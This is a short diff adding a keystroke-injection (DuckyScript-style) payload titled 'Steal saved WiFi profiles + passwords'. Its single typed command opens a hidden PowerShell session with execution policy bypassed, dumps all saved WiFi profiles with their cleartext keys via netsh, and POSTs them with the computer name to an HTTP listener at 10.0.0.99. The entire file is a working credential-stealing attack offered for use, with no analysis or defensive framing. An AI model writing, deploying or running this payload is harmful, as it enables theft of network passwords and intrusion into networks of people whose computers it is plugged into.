@@ -1,0 +1,7 @@
+REM Title: Steal saved WiFi profiles + passwords
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -nop -ep bypass -c "$o='';(netsh wlan show profiles)|Select-String ':\s(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$o+=\"`n[$n]`n\";$o+=(netsh wlan show profile name=\"$n\" key=clear|Out-String)};iwr -Uri http://10.0.0.99:8000/wifi -Method POST -Body @{d=$o;h=$env:COMPUTERNAME}"
+ENTER
